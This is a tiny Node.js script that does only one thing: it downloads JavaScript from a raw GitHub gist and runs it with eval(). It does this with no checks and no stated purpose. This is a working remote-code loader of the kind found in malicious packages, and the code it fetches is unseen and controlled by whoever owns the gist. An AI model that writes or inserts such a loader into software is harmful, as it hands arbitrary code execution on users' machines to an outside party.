const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/ca4a4c72e1c310f53e9447a092c4b8617ed38d1d/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
